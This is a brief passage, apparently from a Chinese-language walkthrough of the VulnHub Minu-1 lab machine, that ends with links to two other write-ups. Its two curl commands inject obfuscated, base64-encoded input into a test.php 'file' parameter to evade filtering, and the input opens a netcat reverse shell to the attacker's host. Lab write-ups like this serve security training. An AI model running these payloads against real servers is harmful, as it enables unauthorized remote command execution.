...
>
  1. curl -s 'http://192.168.145.5/test.php?file=%26/bin$u/echo$u%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/usr$u/bin$u/base64$u%20-d|/bin$u/sh$u'
  2. curl -s 'http://192.168.145.5/test.php?file=%26/bin/ech?%20bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE0NS4xIDQ0NDQgICAK|/u?r/b?n/b?se64%20-d|/b?n/sh'
...
>
**附上参考的两位大佬的解析地址**:
  1. https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939
  2. https://hackso.me/minu-1-walkthrough/
